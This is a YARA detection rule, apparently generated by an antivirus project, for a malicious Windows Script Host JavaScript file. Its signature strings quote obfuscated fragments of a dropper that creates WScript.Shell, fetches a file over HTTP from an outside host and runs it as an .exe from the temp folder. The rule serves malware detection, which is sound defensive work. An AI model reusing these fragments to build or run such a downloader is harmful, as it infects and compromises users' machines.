rule sig_20160329_fe0b0d0c4a7c5e467dec574974befc1b {
  meta:
    description = "datamaliciousorder - file 20160329_fe0b0d0c4a7c5e467dec574974befc1b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "5b43053a07033a8f804daa2810cf8188768c58e268561ebbbdb09beb63ba5deb"

  strings:
    $s1  = "function Gjcpytqh() {return Xsvpau[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"mvw5Vo6VoA.exe\";};" fullword ascii
    $s2  = "do {WScript[Mdfqsrmkn](Rgphy() * 11)} while (Jnmarafm[\"readystate\"] < 4 );" fullword ascii
    $s3  = "Jnmarafm[Wxvvrtlsp](\"GET\", \"http://indochinaplazahanoi.info/fduew\", false);" fullword ascii
    $s4  = "var Xsvpau = function Sregrrxuk() {return WScript[Tioxyri](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Cfggyyxdql(Xizkhqcne, Qsxfwko){return Xizkhqcne - Qsxfwko;};" fullword ascii
    $s6  = "function Brbwev() {return ((Cwngidmkp == true) && (Cwngidmkp == Uuczxkja)) ? 1 : Onhkic;};" fullword ascii
    $s7  = "function Fzioxkhzbj(){return Ohmyt;};" fullword ascii
    $s8  = "return Cfggyyxdql(Bahpme, Lbipjac);" fullword ascii
    $s9  = "Cwngidmkp = true; " fullword ascii
    $s10 = "function Fikgrgrz(Oakrle) {var Jaibp = (1, 2, 3, 4, 5, Oakrle); return Jaibp;};" fullword ascii
    $s11 = " while (Mneuvsp){" fullword ascii
    $s12 = "function Kaedh()" fullword ascii
    $s13 = "function Rgphy(){return 22;};" fullword ascii
    $s14 = "function Amukmxr(){return Tioxyri;};" fullword ascii
    $s15 = "var Smczl = new this[\"Date\"]();" fullword ascii
    $s16 = "Uuczxkja = true; " fullword ascii
    $s17 = "var Pyztjoz = false;" fullword ascii
    $s18 = "var Cwngidmkp = false;" fullword ascii
    $s19 = "var Uuczxkja = false;" fullword ascii
    $s20 = "function Dluca(Fwkwbhin){Xsvpau[\"Run\"](Fwkwbhin, Onhkic, Onhkic);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}